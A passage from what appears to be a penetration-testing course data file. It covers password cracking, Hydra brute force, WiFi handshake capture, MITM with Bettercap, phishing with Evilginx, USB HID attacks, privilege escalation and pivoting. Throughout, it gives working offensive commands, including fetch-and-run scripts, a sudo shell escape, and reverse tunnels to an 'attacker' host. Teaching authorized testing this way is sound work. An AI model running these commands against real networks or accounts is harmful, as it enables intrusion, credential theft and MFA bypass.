          'John the Ripper: "john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hashes.txt" — versatile CPU-based cracker supporting 300+ hash formats; auto-detects hash types, supports rules and incremental (brute-force) modes',
          'Hashcat: "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r rules/best64.rule" — GPU-accelerated cracker that is 10-100x faster than CPU; -m (hash mode: 0=MD5, 1000=NTLM, 1800=sha512crypt, 13100=Kerberoast), -a (attack mode: 0=dictionary, 3=mask, 6=hybrid)',
          'Rule-based attacks: rules transform wordlist words (capitalize, append numbers, leet speak, reverse) — "hashcat ... -r rules/best64.rule" applies the 64 most effective transformations; John\'s rules: "--rules=All" applies comprehensive transformations; custom rules target organization-specific password patterns',
          'Mask attacks: "hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?s" — brute-forces passwords matching a pattern (?u=uppercase, ?l=lowercase, ?d=digit, ?s=special); faster than pure brute-force because it targets known password structures like "Password123!"',
          'Hash extraction: "hashcat -m 13600 keepass_hash.txt wordlist.txt" for KeePass, john2hash tools convert files to crackable formats — unshadow (Linux /etc/passwd + /etc/shadow), zip2john, rar2john, pdf2john, keepass2john, ssh2john extract hashes from encrypted files and databases',
        ],
        tradeoffs: [
          'GPU cracking (Hashcat) is dramatically faster but requires compatible GPUs and drivers — a single RTX 4090 cracks NTLM at 300+ billion hashes/second vs millions/second on CPU; for time-limited engagements, GPU access is essential for complex hashes',
          'Wordlist + rules attacks cover common password patterns efficiently but miss truly random passwords — mask/brute-force attacks are comprehensive but time for completion grows exponentially with password length (8 characters of all character types ≈ 7 hours on fast GPU)',
          'Offline cracking has no lockout risk (unlike online attacks) but requires first obtaining the hashes — the effort to acquire hashes (SAM dump, NTDS.dit extraction, Kerberoasting, database dump) is often the harder part of the attack',
        ],
        realWorld: [
          'Active Directory penetration test workflow: Kerberoast service accounts ("GetUserSPNs.py -outputfile kerberoast.txt"), then crack TGS tickets offline with Hashcat: "hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule" — service account passwords are frequently weak and grant significant access',
          'Password audit engagements: organizations provide their SAM/NTDS.dit database, and the tester cracks all hashes to assess password policy effectiveness — reports showing that 60%+ of passwords crack in minutes using common wordlists are powerful motivators for policy improvement',
          'CTF challenges frequently include hash cracking: identify the hash type (hashid, hash-identifier), select the correct mode, and crack with rockyou.txt — most CTF hashes are designed to crack quickly with the right approach',
          'Cloud GPU cracking: services like AWS p3/p4 instances with Tesla V100/A100 GPUs provide massive cracking power on demand — testers spin up GPU instances for time-limited cracking runs rather than investing in expensive hardware',
        ],
      },
      {
        id: '9-2',
        name: 'Online Brute Force (Hydra, Medusa, CeWL)',
        description:
          'Attacking live authentication services by systematically testing username/password combinations — using tools like Hydra and Medusa for network service brute-forcing, and CeWL for generating target-specific wordlists from website content.',
        keyPoints: [
          'Hydra: "hydra -l admin -P /usr/share/wordlists/rockyou.txt target ssh" — the most popular online brute-forcer; supports 50+ protocols including SSH, FTP, HTTP, SMB, RDP, MySQL, MSSQL, LDAP, VNC, and web forms',
          'HTTP form brute-force: "hydra -l admin -P wordlist.txt target http-post-form \'/login:username=^USER^&password=^PASS^:Invalid credentials\'" — ^USER^ and ^PASS^ are placeholders; the failure string ("Invalid credentials") tells Hydra which responses indicate failed login',
          'CeWL (Custom Word List generator): "cewl -d 3 -m 6 -w custom_wordlist.txt https://target.com" — crawls the target website to depth 3, extracting words of minimum 6 characters; generates wordlists based on the target organization\'s actual terminology, product names, and jargon',
          'Username enumeration: before brute-forcing, enumerate valid usernames — timing differences in login responses, different error messages for valid vs invalid usernames, and tools like Kerbrute for Active Directory username enumeration help narrow the attack',
          'Credential stuffing: test previously breached credentials against the target — "hydra -C creds.txt target ssh" uses colon-separated username:password pairs; breached credential databases (available on the dark web and in tools like BreachCompilation) make this attack devastatingly effective',
        ],
        tradeoffs: [
          'Online brute-forcing is slow (limited by network latency and server response time) compared to offline cracking — a single-threaded SSH brute-force might test 5-10 passwords/second vs billions/second offline; focus on small, targeted wordlists rather than exhaustive attacks',
          'Account lockout policies can render brute-force attacks impossible and may alert the SOC — always check the lockout policy before attacking; password spraying (one password against many accounts) avoids lockout thresholds while still being effective',
          'CeWL-generated wordlists are highly targeted but small — combine CeWL output with rules (appending years, numbers, special characters) to expand coverage while maintaining relevance to the target organization',
        ],
        realWorld: [
          'Password spraying against Active Directory: "crackmapexec smb target_range -u users.txt -p \'Summer2024!\' --continue-on-success" — tests one common password against all domain users; passwords following the Season+Year+Symbol pattern are found in nearly every AD engagement',
          'CeWL in practice: for a hospital penetration test, CeWL against the hospital website generates words like department names, doctor names, and medical terminology — combined with common password patterns, this creates a highly effective targeted wordlist',
          'Default credential checking: before brute-forcing, always check for default credentials — Tomcat (tomcat:tomcat), Jenkins (admin:admin), IPMI (ADMIN:ADMIN), network devices (admin:password) — tools like changeme and default-credentials-cheatsheet systematize this check',
          'Bug bounty caution: most programs explicitly prohibit brute-forcing production login pages — credential testing is only acceptable when the program scope allows it and rate limiting suggests the application can handle automated requests',
        ],
      },
      {
        id: '9-3',
        name: 'Wordlist Generation & Hash Identification (Crunch, CUPP, hash-identifier)',
        description:
          'Creating custom wordlists tailored to specific targets and identifying unknown hash types — essential skills for making password attacks targeted, efficient, and successful.',
        keyPoints: [
          'Crunch: "crunch 8 10 -t @@@@@@%% -o custom.txt" — generates wordlists based on character sets and patterns; @=lowercase, ,=uppercase, %=number, ^=symbol; useful for brute-forcing when you know the password policy (e.g., 8-10 chars with 2 trailing digits)',
          'CUPP (Common User Passwords Profiler): "cupp -i" — interactive mode asks for target\'s name, birthday, partner, pet, company, etc., then generates a personalized wordlist based on common password creation patterns (name+birthday, pet+year, company+123)',
          'Mentalist: GUI-based wordlist generator that lets you build complex wordlist generation chains — combine base words, apply transformations (capitalization, leet speak, appending), and preview results before generating the full wordlist',
          'Hash identification: "hashid \'$6$rounds=5000$salt$hash\'" or "hash-identifier" — identifies hash types from the hash format; hashid recognizes 300+ hash types and provides the corresponding Hashcat (-m) and John (--format) mode numbers',
          'Wordlist optimization: "sort wordlist.txt | uniq > deduped.txt" removes duplicates; "pw-inspector -m 8 -M 20 -l -u -n < wordlist.txt > filtered.txt" filters by length and character requirements — matching the target\'s password policy dramatically reduces cracking time',
        ],
        tradeoffs: [
          'Generated wordlists can be enormous — crunch generating all 8-character lowercase+digit combinations creates a 2TB file; use patterns and constraints to keep wordlists manageable, or pipe directly to the cracking tool: "crunch 8 8 -t @@@@%%%% | hashcat -m 0 hashes.txt"',
          'CUPP creates highly targeted wordlists but requires social engineering or OSINT to gather the input data (target\'s personal information) — the effectiveness of CUPP is directly proportional to the quality of the intelligence gathered about the target',
          'Hash identification tools are usually accurate but can be ambiguous (many hash formats share the same character set and length) — when in doubt, try multiple hash modes in Hashcat until one produces results',
        ],
        realWorld: [
          'Targeted attack scenario: OSINT reveals the CFO\'s dog is named "Max" and they graduated in 2005 — CUPP generates Max2005!, Max2005#, M@x2005!, max2005!!, etc.; this targeted approach cracks passwords that rockyou.txt would miss',
          'Password policy exploitation: if the policy requires "8+ characters, one uppercase, one number, one symbol" — crunch generates pattern-based wordlists matching exactly these requirements: "crunch 8 12 -t ,@@@@%%^" for Uppercase+lowercase+digits+symbol',
          'CTF hash cracking workflow: copy the hash, run "hashid" to identify the type, check if rockyou.txt cracks it, if not try rules or mask attacks based on the CTF theme — most CTF hashes are solvable with the right approach and tool combination',
          'SecLists (/usr/share/seclists/) is the essential wordlist collection: Discovery/Web-Content for directory brute-forcing, Passwords/ for credential attacks, Usernames/ for user enumeration, Fuzzing/ for injection testing — "apt install seclists" is one of the first commands on a fresh Kali install',
        ],
      },
    ],
  },
  {
    id: 10,
    title: 'Wireless & Network Attacks',
    part: 3,
    partTitle: 'Exploitation & Attack Tools',
    summary:
      'Wireless network security testing and network-level attacks — from WiFi reconnaissance and WPA handshake cracking with the Aircrack-ng suite to man-in-the-middle attacks with Bettercap.',
    concepts: [
      {
        id: '10-1',
        name: 'Aircrack-ng Suite & WiFi Reconnaissance',
        description:
          'The Aircrack-ng suite of tools for wireless network auditing — putting adapters into monitor mode, capturing wireless traffic, and analyzing the WiFi environment to identify target networks and clients.',
        keyPoints: [
          'Monitor mode setup: "airmon-ng check kill" (kill interfering processes like NetworkManager) then "airmon-ng start wlan0" — creates wlan0mon interface capable of capturing all WiFi frames in range, not just those addressed to your device',
          'Airodump-ng reconnaissance: "airodump-ng wlan0mon" — displays all visible access points (BSSID, channel, encryption, ESSID, signal strength) and connected clients; essential for identifying target networks and selecting the appropriate attack',
          'Targeted capture: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon" — locks onto a specific access point on channel 6 and writes captured packets to a file; wait for a WPA handshake or use deauthentication to force one',
          'Adapter requirements: not all WiFi adapters support monitor mode and packet injection — the Alfa AWUS036ACH (dual-band AC), AWUS036NHA (N-speed 2.4GHz), and TP-Link TL-WN722N v1 (not v2/v3) are the most reliable Kali-compatible adapters with the correct chipsets (Realtek RTL8812AU, Atheros AR9271)',
          'Wireless frame types: management frames (beacons, probes, authentication, deauthentication), control frames (ACK, RTS/CTS), and data frames (actual payload) — understanding 802.11 frame types is essential for interpreting captures and crafting attacks',
        ],
        tradeoffs: [
          'Monitor mode disables normal WiFi connectivity on that adapter — you need a second adapter (or Ethernet connection) for internet access while conducting wireless attacks',
          'WiFi adapter compatibility is a persistent pain point — many modern adapters use chipsets without monitor mode/injection support in Linux; always verify chipset compatibility before purchasing',
          'Wireless testing has a physical proximity requirement (radio range, typically 50-100 meters) — this limits wireless assessments to on-site engagements and makes them fundamentally different from remote network testing',
        ],
        realWorld: [
          'Wireless penetration test setup: arrive on-site, plug in an Alfa adapter, run "airmon-ng start wlan0", run "airodump-ng wlan0mon" — within minutes you have a complete picture of the client\'s wireless environment including unauthorized rogue access points',
          'Rogue access point detection: compare the list of BSSIDs discovered by airodump-ng against the client\'s authorized AP inventory — unauthorized APs connected to the corporate network are a critical finding in any wireless assessment',
          'Wireless CTF challenges: events like WCTF (Wireless CTF) use aircrack-ng suite tools to capture and crack various wireless encryption schemes — participants must identify networks, capture handshakes, and crack keys within time limits',
          'The WiFi Pineapple (Hak5) is a purpose-built wireless auditing platform that automates many aircrack-ng suite functions — but understanding the underlying aircrack-ng tools is essential for troubleshooting and advanced attacks',
        ],
      },
      {
        id: '10-2',
        name: 'WPA/WPA2 Handshake Capture & Cracking',
        description:
          'Capturing the WPA/WPA2 four-way handshake between a client and access point, then cracking the pre-shared key offline using dictionary and brute-force attacks.',
        keyPoints: [
          'Deauthentication attack: "aireplay-ng -0 5 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon" — sends 5 deauthentication frames to disconnect a specific client, forcing them to reconnect and generate a new four-way handshake that airodump-ng captures',
          'Handshake capture verification: airodump-ng displays "WPA handshake: [BSSID]" in the upper right when a valid handshake is captured — alternatively, "aircrack-ng capture.cap" reports whether the capture contains a valid handshake',
          'Aircrack-ng cracking: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap" — tests each word in the wordlist against the captured handshake; CPU-based, ~1000 keys/second on modern hardware; sufficient for common passwords',
          'Hashcat GPU cracking: convert the capture first: "aircrack-ng capture.cap -J hashcat_input" (creates .hccapx) or use hcxpcapngtool, then "hashcat -m 22000 hashcat_input.hc22000 rockyou.txt" — GPU acceleration provides 500,000+ keys/second, making larger wordlists and rule-based attacks practical',
          'PMKID attack: "hcxdumptool -i wlan0mon -o output.pcapng --enable_status=3" — captures the PMKID from the first EAPOL frame without needing a full handshake or client deauthentication; discovered in 2018, this attack works against WPA/WPA2 PSK networks with roaming enabled (802.11r) and is less intrusive',
        ],
        tradeoffs: [
          'Deauthentication attacks are effective but noisy — they disrupt service for the targeted client and are detectable by WIDS (Wireless Intrusion Detection Systems); the PMKID method is stealthier when available but does not work against all access points',
          'WPA2 handshake cracking is fundamentally a password guessing attack — complex, long passphrases (15+ random characters) are practically uncrackable even with GPU clusters; the attack succeeds only when the PSK is based on dictionary words or common patterns',
          'WPA3 (SAE - Simultaneous Authentication of Equals) is resistant to offline handshake cracking — as WPA3 adoption increases, traditional WPA2 cracking attacks will become less relevant; however, WPA2 will remain common for years',
        ],
        realWorld: [
          'Standard wireless pentest: capture a WPA2 handshake in the first 10 minutes, start cracking immediately on a GPU-equipped laptop, continue with other assessment activities while cracking runs — if the PSK is weak (dictionary word + numbers), it typically cracks within minutes to hours',
          'Corporate WiFi assessment finding: the guest network uses WPA2-PSK with the password "CompanyName2024" — this is a common finding that demonstrates the risk of predictable PSK passwords; the recommendation is always WPA2/3-Enterprise (802.1X with RADIUS)',
          'Hashcat rule-based WPA2 cracking: "hashcat -m 22000 capture.hc22000 wordlist.txt -r rules/best64.rule" — rules transform base words into common password patterns, dramatically increasing the effective wordlist size without proportional time increase',
          'WPA cracking contests at security conferences demonstrate the speed of modern GPU cracking: a cluster of RTX 4090s can test the entire rockyou.txt wordlist with complex rules against a WPA2 handshake in minutes',
        ],
      },
      {
        id: '10-3',
        name: 'Network MITM Attacks (Bettercap, ARP Spoofing, Evil Twin)',
        description:
          'Man-in-the-middle (MITM) attacks that intercept network traffic between victims and their intended destination — using ARP spoofing, evil twin access points, and Bettercap for credential capture and traffic manipulation.',
        keyPoints: [
          'Bettercap: the Swiss Army knife for MITM attacks — "sudo bettercap -iface eth0" starts the interactive framework; "net.probe on; net.sniff on; arp.spoof on; set arp.spoof.targets 192.168.1.100" performs ARP spoofing and captures all traffic from the target',
          'ARP spoofing: sends gratuitous ARP replies to poison the ARP cache of the target and the gateway — the target sends traffic to the attacker (thinking it is the gateway), the attacker forwards it to the real gateway after inspection; the attacker sees all unencrypted traffic',
          'SSL stripping: "set http.proxy.sslstrip true" in Bettercap downgrades HTTPS connections to HTTP — the victim connects to the attacker over HTTP while the attacker connects to the server over HTTPS; HSTS (HTTP Strict Transport Security) defeats this attack for sites that implement it',
          'Evil Twin AP: create a fake access point with the same ESSID as the target network — "airbase-ng -a [AP_BSSID] --essid \"TargetNetwork\" -c 6 wlan0mon" combined with DHCP and iptables forwarding; victims connect to the fake AP, and all their traffic flows through the attacker',
          'Credential capture: Bettercap\'s net.sniff module captures plaintext credentials (HTTP, FTP, Telnet, SMTP); combined with http.proxy for HTTP traffic inspection and dns.spoof for redirecting specific domains to attacker-controlled servers hosting phishing pages',
        ],
        tradeoffs: [
          'ARP spoofing works on local switched networks but is easily detected by network monitoring tools, port security, and Dynamic ARP Inspection (DAI) — enterprise networks with proper switch configuration can prevent ARP spoofing entirely',
          'SSL stripping is increasingly ineffective as HSTS adoption grows and browsers enforce HTTPS — modern browsers show clear warnings for HTTP connections, reducing the success rate of HTTPS downgrade attacks',
          'Evil Twin attacks require physical proximity and a wireless adapter but are highly effective in public WiFi environments — however, they are detectable by WIDS and may be illegal without explicit authorization even in a penetration test scope',
        ],
        realWorld: [
          'Internal penetration test: ARP spoof the default gateway for a network segment, run Bettercap net.sniff, and capture plaintext credentials — legacy protocols (FTP, Telnet, SMTP without TLS, HTTP admin panels) still transmit credentials in cleartext in many enterprise environments',
          'WiFi security awareness demonstrations: set up an Evil Twin AP at a security conference or corporate training event, show attendees how their traffic is visible, and capture consent-based credentials to demonstrate the risk of connecting to untrusted WiFi networks',
          'Responder/LLMNR poisoning (related MITM technique): "responder -I eth0 -wF" — poisons LLMNR/NBT-NS queries on Windows networks to capture NetNTLMv2 hashes; this technique succeeds in virtually every Active Directory penetration test and provides hashes for offline cracking',
          'Bettercap caplets: pre-built scripts that automate complex MITM scenarios — "bettercap -caplet hstshijack/hstshijack" attempts to bypass HSTS by replacing target domains with similar-looking alternatives (e.g., wwww.target.com instead of www.target.com)',
        ],
      },
    ],
  },

  // Part 4: Advanced Topics
  {
    id: 11,
    title: 'Social Engineering & Client-Side Attacks',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'Attacking the human element — using the Social Engineering Toolkit (SET) for phishing campaigns, creating convincing credential harvesting pages, and deploying physical attack vectors like USB-based HID attacks.',
    concepts: [
      {
        id: '11-1',
        name: 'Social Engineering Toolkit (SET)',
        description:
          'The Social Engineering Toolkit (SET) — an open-source framework designed specifically for social engineering attacks — providing automated phishing, credential harvesting, malicious payload delivery, and website cloning capabilities.',
        keyPoints: [
          'SET menu system: "sudo setoolkit" launches the interactive menu — (1) Social-Engineering Attacks, (2) Penetration Testing (Fast-Track), (3) Third Party Modules; the social engineering menu branches into spear phishing, website attacks, infectious media, and more',
          'Website cloning: Social-Engineering Attacks → Website Attack Vectors → Credential Harvester → Site Cloner — SET clones the target login page (e.g., Gmail, Office 365, corporate VPN), hosts it on the attacker\'s server, and captures any credentials entered by victims who visit the cloned page',
          'Spear phishing: Social-Engineering Attacks → Spear-Phishing Attack Vectors — SET crafts emails with malicious attachments (PDF, Office macros, HTA files) and sends them to specific targets; supports custom email templates, SMTP server configuration, and attachment payload selection',
          'Java applet attack: website attack vector that presents a fake Java update prompt — largely obsolete due to browser Java deprecation but demonstrates the attack pattern of exploiting user trust in software update prompts',
          'PowerShell attack: generates encoded PowerShell reverse shell payloads that can be delivered via phishing, USB, or other vectors — "powershell -ep bypass -e [base64_payload]" is a common delivery mechanism that executes entirely in memory',
        ],
        tradeoffs: [
          'SET automates social engineering attacks but the cloned pages and phishing emails are generic — sophisticated targets (security-aware employees, organizations with email security gateways) require customized campaigns that SET alone cannot create',
          'SET credential harvesting captures credentials in plaintext but modern 2FA/MFA defeats simple credential capture — advanced phishing frameworks (Evilginx2, Modlishka) act as real-time reverse proxies that capture session cookies and 2FA tokens, bypassing MFA',
          'Social engineering assessments have significant legal and ethical considerations — explicit written authorization, clear scope definition, and careful handling of captured credentials are mandatory; unauthorized social engineering is illegal',
        ],
        realWorld: [
          'Corporate phishing simulation: the security team uses SET to clone the corporate email login page, sends a phishing email to all employees, and measures how many click the link and enter credentials — results inform security awareness training priorities',
          'Red team engagement: SET clones the target\'s VPN login portal, registers a look-alike domain (targetcorp.com → targetc0rp.com), and sends targeted phishing emails to IT staff — captured VPN credentials provide initial access to the internal network',
          'Evilginx2 (advanced alternative): operates as a transparent reverse proxy between the victim and the real login page, capturing not just credentials but the entire authenticated session cookie — this technique bypasses most MFA implementations and is the current state of the art in phishing attacks',
          'GoPhish is the professional alternative for phishing simulations: it provides campaign management, email templates, landing pages, and detailed reporting (who opened, who clicked, who submitted) — preferred over SET for large-scale, repeatable phishing assessments',
        ],
      },
      {
        id: '11-2',
        name: 'Phishing Frameworks & Credential Harvesting',
        description:
          'Building and deploying sophisticated phishing campaigns — from domain setup and email delivery to landing page creation and real-time credential/session capture — using modern phishing frameworks that bypass security controls.',
        keyPoints: [
          'Infrastructure setup: register a look-alike domain (typosquatting, homograph attacks), provision a VPS, configure SPF/DKIM/DMARC for email deliverability, obtain a Let\'s Encrypt TLS certificate for the phishing domain — proper infrastructure is the difference between emails reaching the inbox vs spam folder',
          'GoPhish framework: "gophish" starts the web interface — create email templates (HTML with tracking), landing pages (cloned login forms), configure sending profiles (SMTP), build recipient groups (from OSINT), and launch campaigns; detailed reporting shows open rates, click rates, and credential submissions',
          'Evilginx2 reverse proxy phishing: "evilginx2" then "phishlets enable o365; lures create o365" — acts as a transparent man-in-the-middle between the victim and the real login page; captures credentials AND session cookies, bypassing MFA; the victim sees the real login flow and real 2FA prompts',
          'Email security bypass: HTML smuggling embeds payloads in JavaScript that constructs the malicious file client-side (bypassing email attachment scanning); QR code phishing (quishing) uses QR codes in emails to bypass URL scanning; voice phishing (vishing) combines phone calls with follow-up phishing emails for social credibility',
          'Pretexting: the social engineering narrative that makes the phishing email convincing — IT department password reset, HR benefits enrollment, CEO wire transfer request, vendor invoice — the pretext must be believable, urgent, and relevant to the target; personalization from OSINT significantly increases success rates',
        ],
        tradeoffs: [
          'Sophisticated phishing infrastructure (domain aging, email authentication, TLS) takes days to set up but dramatically improves delivery rates and victim trust — quick, low-effort phishing is increasingly caught by modern email security gateways (Proofpoint, Mimecast, Microsoft Defender)',
          'Evilginx2 bypasses MFA but requires real-time victim interaction and careful infrastructure management — the phishing session must be active when the victim authenticates; if the victim delays, the phishlet session may expire',
          'Phishing assessments must balance realism with employee well-being — overly aggressive or personal phishing pretexts (fake HR termination notices, fake family emergencies) can damage employee trust and morale even when authorized',
        ],
        realWorld: [
          'The 2020 Twitter hack used phone-based social engineering (vishing) to convince Twitter employees to provide access to internal admin tools — demonstrating that even technology companies with security-aware staff are vulnerable to well-crafted social engineering',
          'APT groups like Fancy Bear (APT28) and Cozy Bear (APT29) routinely use OAuth consent phishing and Evilginx-style reverse proxy phishing to compromise government and corporate targets — the same techniques penetration testers use to demonstrate risk',
          'Microsoft reports that MFA blocks 99.9% of automated attacks but real-time phishing proxies (Evilginx2, Modlishka, Muraena) demonstrate that MFA is not bulletproof — FIDO2/WebAuthn hardware keys are the only phishing-resistant MFA factor',
          'Professional red team phishing campaigns achieve 20-40% click rates and 10-20% credential submission rates even at security-conscious organizations — demonstrating the persistent effectiveness of well-crafted social engineering despite security awareness training',
        ],
      },
      {
        id: '11-3',
        name: 'HID Attacks & Physical Vectors (Rubber Ducky, Bad USB, Dropbox Devices)',
        description:
          'Physical attack vectors that exploit human trust in USB devices and physical access — from keystroke injection attacks (Rubber Ducky) to network implants (LAN Turtle) and rogue devices dropped in target locations.',
        keyPoints: [
          'USB Rubber Ducky (Hak5): a USB device that appears as a keyboard (HID - Human Interface Device) and types pre-programmed keystrokes at superhuman speed — "ducky scripts" automate attacks like opening PowerShell and executing a reverse shell payload in under 3 seconds; undetectable by most endpoint protection because it is a "keyboard"',
          'Bad USB attacks: any USB device (flash drive, charging cable, even a fan) can be modified to enumerate as a HID keyboard — the O.MG Cable looks like a normal Lightning/USB-C cable but contains a wireless implant that injects keystrokes and provides remote access',
          'Bash Bunny (Hak5): multi-function USB attack platform that can emulate keyboard, storage, and Ethernet simultaneously — attacks include network credential theft (Responder), data exfiltration, and reverse shell deployment; payload switching via physical toggle',
          'LAN Turtle (Hak5): a covert network implant disguised as a USB Ethernet adapter — plugs into a target\'s workstation USB port, bridges their network connection, and provides remote access to the internal network via reverse SSH; ideal for physical penetration tests where persistent access is needed',
          'Dropbox attacks: leave a configured device (Raspberry Pi, LAN Turtle, WiFi Pineapple) in a target location — the device connects to the network, establishes a reverse tunnel to the attacker, and provides persistent remote access to the internal network for the duration of the engagement',
        ],
        tradeoffs: [
          'HID attacks are fast and bypass most software defenses (antivirus, endpoint detection) but require physical access to the target machine — this limits their use to on-site engagements and targeted attacks; USB port disabling policies and endpoint DLP can mitigate HID attacks',
          'Commercial devices (Rubber Ducky $50, Bash Bunny $100, O.MG Cable $120+) are convenient but leave a financial and potentially traceable trail — DIY alternatives (Arduino Leonardo, Teensy, Digispark) are cheaper but require more technical setup',
          'Network implant devices (LAN Turtle, Raspberry Pi dropbox) provide persistent access but can be discovered during physical security sweeps or network monitoring — use covert form factors and encrypted tunnels to maximize dwell time',
        ],
        realWorld: [
          'Physical penetration test scenario: the tester gains building access via tailgating, plugs a LAN Turtle into an unattended workstation in a conference room, and leaves — the device provides remote network access for the remainder of the engagement without the tester needing to return on-site',
          'Social engineering + USB drop: leave labeled USB drives ("Q3 Salary Review", "Confidential - HR") in the target organization\'s parking lot and common areas — studies consistently show 30-60% of found USB drives are plugged into corporate machines; the drives contain Rubber Ducky payloads that deploy reverse shells',
          'DerbyCon and DEF CON USB drop experiments: researchers dropped USB drives loaded with phone-home beacons in parking lots and conference areas, demonstrating that even security conference attendees plug in unknown USB devices — proving the persistent effectiveness of this attack vector',
          'O.MG Cable in supply chain attacks: the cable is indistinguishable from a genuine Apple/USB-C cable — scenario: replace a target executive\'s charging cable during a physical penetration test; when they plug in their laptop, the cable injects keystrokes and establishes remote access via built-in WiFi',
        ],
      },
    ],
  },
  {
    id: 12,
    title: 'Post-Exploitation & Pivoting',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'What happens after initial exploitation — escalating privileges, moving laterally through the network, establishing persistent access, and exfiltrating data while evading detection.',
    concepts: [
      {
        id: '12-1',
        name: 'Privilege Escalation (LinPEAS, WinPEAS, GTFOBins, Kernel Exploits)',
        description:
          'Escalating from a low-privileged shell to root/SYSTEM access — using automated enumeration scripts to find misconfigurations, SUID binaries, vulnerable services, and kernel exploits that enable privilege escalation.',
        keyPoints: [
          'LinPEAS/WinPEAS: "curl -L https://github.com/.../linpeas.sh | sh" or download and run — comprehensive enumeration scripts that check hundreds of privilege escalation vectors: SUID/SGID binaries, writable paths, cron jobs, capabilities, kernel version, misconfigurations, credentials in files, and more; output is color-coded (red = high probability of escalation)',
          'GTFOBins (Linux) / LOLBAS (Windows): curated databases of legitimate system binaries that can be abused for privilege escalation, file operations, and command execution — if find, vim, python, nmap, or hundreds of other binaries have SUID set or run as root in a cron job, GTFOBins shows how to exploit them',
          'Kernel exploits: "uname -a" reveals the kernel version, then search for matching exploits: "searchsploit linux kernel [version]" — DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195), and PwnKit (CVE-2021-4034) are famous kernel privilege escalation exploits that work on unpatched systems',
          'Windows privilege escalation: unquoted service paths, writable service binaries, AlwaysInstallElevated registry keys, token impersonation (Juicy Potato/PrintSpoofer/GodPotato), and missing patches — WinPEAS enumerates all of these automatically',
          'Sudo misconfigurations: "sudo -l" lists what the current user can run as root — entries like "NOPASSWD: /usr/bin/vim" or "NOPASSWD: /usr/bin/find" allow direct escalation via GTFOBins techniques (e.g., "sudo find / -exec /bin/bash \\;")',
        ],
        tradeoffs: [
          'Automated tools (LinPEAS/WinPEAS) are thorough but generate significant output and file system activity that may trigger EDR alerts — on monitored systems, manual enumeration of specific vectors may be stealthier',
          'Kernel exploits provide reliable escalation on unpatched systems but can crash the machine if they fail — always verify the exact kernel version and test in a lab environment before attempting kernel exploits on production systems',
          'GTFOBins/LOLBAS techniques exploit legitimate functionality (not vulnerabilities) which means they work even on patched systems — but they require the specific binary to be SUID, in sudo, or otherwise misconfigured; proper security hardening removes these vectors',
        ],
        realWorld: [
          'OSCP privilege escalation methodology: get a shell → run "sudo -l" → check SUID binaries ("find / -perm -4000 2>/dev/null") → run LinPEAS → check GTFOBins for any promising binary → check kernel version for known exploits → enumerate cron jobs and writable scripts',
          'PwnKit (CVE-2021-4034): a vulnerability in polkit\'s pkexec that existed for 12+ years and provided instant root on nearly every Linux distribution — LinPEAS flags this automatically; the exploit is trivial (compile and run a single C file) and worked on default installations of Ubuntu, Debian, CentOS, and more',
          'PrintSpoofer/GodPotato: Windows privilege escalation from service accounts with SeImpersonatePrivilege (e.g., web application pools, SQL Server) to SYSTEM — "PrintSpoofer.exe -i -c cmd" provides an instant SYSTEM shell from a web shell or SQL injection',
          'Real-world penetration test finding: a cron job running as root executes a script that the web application user can write to — replace the script content with a reverse shell payload, wait for the cron job to execute, and receive a root shell; this is one of the most common privilege escalation findings in Linux environments',
        ],
      },
      {
        id: '12-2',
        name: 'Lateral Movement & Pivoting (Port Forwarding, SOCKS, Chisel, Ligolo)',
        description:
          'Moving through a network after initial compromise — using the first compromised host as a pivot point to reach additional systems, forward ports, and create tunnels that enable scanning and exploitation of internal networks.',
        keyPoints: [
          'SSH port forwarding: local ("ssh -L 8080:internal:80 user@pivot" — access internal:80 via localhost:8080), dynamic ("ssh -D 1080 user@pivot" — SOCKS proxy for all traffic), remote ("ssh -R 9999:localhost:22 user@attacker" — expose your SSH through the pivot) — the fundamental building blocks of network pivoting',
          'Chisel: lightweight Go-based TCP/UDP tunneling tool — server: "chisel server --reverse --port 8080", client: "chisel client attacker:8080 R:socks" creates a reverse SOCKS proxy; works through firewalls that allow outbound HTTP, does not require SSH, and is a single binary with no dependencies',
          'Ligolo-ng: next-generation tunneling framework — creates a TUN interface on the attacker machine that provides full IP connectivity to the remote network; "ligolo-proxy" on the attacker, "ligolo-agent -connect attacker:11601" on the pivot — simpler than SOCKS proxying because your tools work natively without proxychains',
          'sshuttle: "sshuttle -r user@pivot 10.10.10.0/24" — creates a transparent VPN-like tunnel through SSH without requiring root on the remote host; all traffic to the specified subnets is routed through the SSH connection; simpler than manual SSH tunneling for accessing entire subnets',
          'Multi-hop pivoting: chain tunnels through multiple compromised hosts to reach deeply segmented networks — Attacker → Pivot1 → Pivot2 → Target; each hop uses SSH forwarding, Chisel, or Ligolo to extend reach further into the network; tools like Metasploit autoroute handle multi-hop routing automatically',
        ],
        tradeoffs: [
          'SSH tunneling is universally available but requires valid SSH credentials and an accessible SSH service — Chisel and Ligolo work when SSH is locked down because they tunnel over HTTP/HTTPS, which is almost always allowed outbound',
          'SOCKS proxying (via SSH -D or Chisel) requires tools to support SOCKS (or use proxychains) and only handles TCP — Ligolo-ng creates a TUN interface with full IP connectivity, making it transparent to tools and supporting ICMP/UDP as well',
          'Each pivot hop adds latency and reduces bandwidth — three hops deep, Nmap scans become painfully slow; adjust scan timing (-T2 or lower) and focus on specific ports/hosts rather than broad sweeps through deep tunnel chains',
        ],
        realWorld: [
          'Internal penetration test pivoting: compromise the DMZ web server → SSH to it → discover the 10.0.0.0/8 internal network → set up Chisel reverse SOCKS → use proxychains to scan internal hosts → find SQL Server with default credentials → pivot again to the database network → reach the domain controller',
          'OSCP exam pivoting: one or more exam machines are only accessible through a previously compromised machine — students must set up port forwarding or SOCKS proxying to scan, enumerate, and exploit the second-tier targets through the pivot',
          'Ligolo-ng popularity surge: since 2023, Ligolo-ng has become the preferred pivoting tool for many penetration testers because its TUN interface approach means every tool (Nmap, Burp Suite, browser, CrackMapExec) works natively without proxychains configuration',
